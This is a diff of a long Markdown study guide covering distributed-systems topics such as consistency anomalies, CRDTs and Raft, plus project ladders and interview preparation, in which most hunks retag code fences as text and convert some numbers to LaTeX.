@@ -11130,7 +11128,7 @@ Conflict resolution has an analogy that explains why CRDTs matter. Two people ed
 
 **Internal Working, the hierarchy and the anomaly each level forbids**
 
-```
+```text
 STRONGEST                                       coordination cost
     |
   LINEARIZABLE          one copy, real-time order        highest
@@ -11163,7 +11161,7 @@ WEAKEST
 
 **Internal Working, each anomaly as it actually occurs**
 
-```
+```text
 SETUP: one primary, two replicas, replication lag 200 ms.
 
 READ-YOUR-OWN-WRITES VIOLATION
@@ -11205,7 +11203,7 @@ CONCURRENT WRITE / LOST UPDATE
 
 **Internal Working, vector clocks versus CRDTs**
 
-```
+```text
 VECTOR CLOCKS -- detect concurrency, then decide what to do
 
   Each replica keeps a counter per node.
@@ -11577,7 +11575,7 @@ A jury doesn't need all twelve members reachable at once to reach a verdict proc
 
 **Internal Working, a Raft election as it happens**
 
-```
+```text
 NORMAL OPERATION, term 4
    [L n1] --heartbeat--> [F n2]
       |   --heartbeat--> [F n3]
@@ -11619,7 +11617,7 @@ SPLIT VOTE, and why the randomisation matters
 
 **Internal Working, log replication and why majority is the magic number**
 
-```
+```text
 CLIENT WRITE, term 5, leader n2
 
   client --set x=1--> [n2 leader]
@@ -11670,7 +11668,7 @@ SPLIT BRAIN, PREVENTED
 
 **Internal Working, the fence that catches a paused leader**
 
-```
+```text
 THE BUG that quorums alone do not fix:
 
   t=0    n1 is leader. It begins writing to shared storage.
@@ -12049,7 +12047,7 @@ Each project on the ladder below is a progressively larger structure. The CLI to
 
 The ladder, and the specific pain each rung is positioned to create:
 
-```
+```text
 Simple CLI tool
         Uses: Phase 1 (execution model), Phase 3 (a data structure to
         actually organize whatever the tool manages)
@@ -12094,7 +12092,7 @@ service that talks to the first over HTTP)
 
 Notice what the ladder actually does. Each rung is engineered so that its *limitation* is felt rather than read:
 
-```
+```text
 PROJECT               THE PAIN IT CREATES          THE PHASE THAT ANSWERS IT
 ------------------------------------------------------------------------------
 CLI tool              "where do I put state        Phase 3: pick the right
@@ -12131,7 +12129,7 @@ Distributed extension  the cache returns stale      Phase 17-18: cache
 
 The internal loop of a single project, which is the same loop every time regardless of which rung you are on:
 
-```
+```text
 1. WRITE THE SMALLEST SPEC
    One paragraph. What it does, who uses it, what "done" means.
    If you cannot write this, the project is not scoped yet.
@@ -12165,7 +12163,7 @@ The internal loop of a single project, which is the same loop every time regardl
 
 Where the projects sit relative to the phases, so you can start building far earlier than the end of the document:
 
-```
+```text
 PHASE:  1   2-9        10-11      12-13     14        15      16      17-18
         |   |          |          |         |         |       |       |
 CLI ----+   |          |          |         |         |       |       |
@@ -12186,7 +12184,7 @@ genuinely require most of the document.
 
 | Choice | What it buys | What it costs | When it is the right call |
 | --- | --- | --- | --- |
-| Small finished project | You reach the unglamorous last 20% where deployment, error handling and edge cases live, which is where most of the learning is | Looks less impressive in a list | Almost always, especially early |
+| Small finished project | You reach the unglamorous last $20\%$ where deployment, error handling and edge cases live, which is where most of the learning is | Looks less impressive in a list | Almost always, especially early |
 | Large ambitious project | Forces genuine architecture and integration across many phases | High risk of abandonment, and an abandoned project teaches roughly nothing | Once you have finished three smaller ones and know your own completion rate |
 | Reimplementation (your own Redis, Git, HTTP server) | A specification you cannot negotiate with, so understanding must be real; unfakeable interview answers | No product decisions, so it trains no design judgment | When you want depth in a specific system you already use |
 | Original application | Ambiguity, ownership, and real design trade-offs to defend | Easy to accidentally avoid every hard part by redefining the requirement | When you want judgment rather than depth |
@@ -12317,7 +12315,7 @@ tracker = Project(
 tracker.audit()
 ```
 
-```
+```text
 ==============================================================
 PROJECT: Expense tracker, file-backed (rung 3 of the ladder)
 Phases used: 1 (memory model), 3 (structures), 14.1 (motivating problem)
@@ -12382,9 +12380,7 @@ record(3.10, "Coffee")           # the un-normalised category flaw, live
 print(monthly_totals())
 ```
 
-```
 {'coffee': 12.4, 'groceries': 64.0, 'Coffee': 3.1}
-```
 
 Two lessons arrive from running this rather than reading it. The full scan in `monthly_totals` is fine at 50 rows and unacceptable at 500,000, which is Phase 14.4's index motivation felt directly. And `coffee` and `Coffee` are now two categories, which is Phase 14.3's normalisation motivation arriving as a bug in your own data rather than a paragraph in a book.
 
@@ -12500,7 +12496,7 @@ Clarifying the problem first is asking where you are being asked to drive to bef
 
 **Internal Working, the forty-five minutes and what is being scored**
 
-```
+```text
   0-2    CLARIFY               <- most skipped, highest ROI
    |     restate in your own words
    |     input size? constraints? empty input? duplicates?
@@ -12544,7 +12540,7 @@ Clarifying the problem first is asking where you are being asked to drive to bef
 
 **Internal Working, reading the intended complexity off the constraints**
 
-```
+```text
 The constraints are a hint the interviewer is obliged to give you.
 Learn to read them and you often know the shape before you think.
 
@@ -12574,7 +12570,7 @@ Learn to read them and you often know the shape before you think.
 
 **Internal Working, how to be stuck correctly**
 
-```
+```text
 BEING STUCK IS EXPECTED AND SCORED. There is a right way.
 
   WRONG                          RIGHT
@@ -12781,7 +12777,7 @@ This section is itself the interview perspective, so what belongs here instead i
 | --- | --- |
 | Easy | Write out the six-step process from memory with a time budget for each step |
 | Easy | Reproduce the pattern catalogue from memory, giving the trigger for each of the fifteen patterns |
-| Easy | For five constraint values (n up to 20, 1000, 10^5, 10^6, 10^9), state the complexity each one implies |
+| Easy | For five constraint values ($n$ up to $20$, $10^3$, $10^5$, $10^6$, or $10^9$), state the complexity each one implies |
 | Easy | Solve one easy problem out loud, recorded, and count how many seconds of total silence there were |
 | Easy | Take a problem you have already solved and write down every edge case from the checklist that applies |
 | Medium | Solve five problems using only the six-step process, on a timer, stating complexity before coding every time |
@@ -12841,7 +12837,7 @@ Then the design is deliberately stressed: fire, earthquake, the lift failing, oc
 
 **Internal Working, what is being scored at each level**
 
-```
+```text
 THE RUBRIC, which is not "did you get the right architecture"
 
   requirement gathering   did you scope an ambiguous prompt?
@@ -12882,7 +12878,7 @@ DEPTH IS WHAT DISTINGUISHES LEVEL. Same prompt, three answers:
 
 **Internal Working, the five failure modes, and the fix for each**
 
-```
+```text
 1. DESIGNING BEFORE SCOPING
      symptom: drawing within 60 seconds of the prompt
      cost:    a beautiful answer to the wrong question = 0
@@ -12929,7 +12925,7 @@ THE SENTENCE THAT SCORES BEST, and is most often unsaid:
 
 **Internal Working, the prompt space and what each one is really testing**
 
-```
+```text
 PROMPT              THE REAL TEST                  MUST-DISCUSS
 ------------------  -----------------------------  --------------------
 URL shortener       read-heavy caching + unique     code generation
@@ -13196,7 +13192,7 @@ And the failure question has the same structure as a reference being asked about
 
 **Internal Working, the STAR-R structure and its time budget**
 
-```
+```text
 TOTAL: 90 seconds to 2 minutes. Most first attempts run 5.
 
   SITUATION   ~15s   |=|
@@ -13234,7 +13230,7 @@ THE THREE DEFECTS, in order of frequency:
 
 **Internal Working, six stories cover the whole question bank**
 
-```
+```text
 Build 6-8 stories. Angle them. Do NOT memorise 40 answers.
 
   STORY                        ANSWERS THESE QUESTIONS
@@ -13282,7 +13278,7 @@ Build 6-8 stories. Angle them. Do NOT memorise 40 answers.
 
 **Internal Working, the failure question, done badly and well**
 
-```
+```text
 QUESTION: "Tell me about a significant mistake you made."
 
   ANSWER THAT FAILS -- the humblebrag
@@ -13570,7 +13566,7 @@ The full-loop point has the same origin. Airlines train fatigue and sequence del
 
 **Internal Working, a full loop simulation**
 
-```
+```text
 Do this ONCE before a real onsite. It is uncomfortable and it is
 the single highest-value exercise in Phase 20.
 
@@ -13609,7 +13605,7 @@ the single highest-value exercise in Phase 20.
 
 **Internal Working, the mock feedback form**
 
-```
+```text
 "That was good" is not feedback. Hand your partner this.
 
   CODING ROUND
@@ -13650,7 +13646,7 @@ the single highest-value exercise in Phase 20.
 
 **Internal Working, the improvement loop**
 
-```
+```text
   MOCK  -->  RECORD  -->  REVIEW  -->  FIX ONE THING  -->  MOCK
     ^                                                        |
     +--------------------------------------------------------+
